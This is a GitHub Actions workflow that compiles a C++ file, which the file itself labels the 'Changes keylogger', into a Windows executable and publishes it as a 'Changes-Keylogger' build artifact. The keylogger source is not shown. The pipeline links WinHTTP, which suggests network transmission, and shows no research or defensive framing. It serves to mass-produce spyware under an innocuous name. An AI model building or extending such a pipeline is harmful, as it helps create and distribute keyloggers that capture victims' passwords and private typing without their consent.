name: Build Executable

on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]
  workflow_dispatch:

jobs:
  compile:
    runs-on: windows-latest
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Setup MSVC
      uses: ilammy/msvc-dev-cmd@v1
      
    - name: Compile
      run: |
        echo "Compiling Changes keylogger..."
        cl Changes.cpp ^
          /link winhttp.lib user32.lib shell32.lib ole32.lib gdi32.lib ^
          /Fe:Changes.exe ^
          /O2 /MT /W0
        
    - name: Verify compilation
      run: |
        if exist Changes.exe (
          echo "✅ Compilation successful!"
          echo "File size: $((Get-Item Changes.exe).Length) bytes"
        ) else (
          echo "❌ Compilation failed!"
          exit 1
        )
        
    - name: Upload executable
      uses: actions/upload-artifact@v4
      with:
        name: Changes-Keylogger
        path: Changes.exe
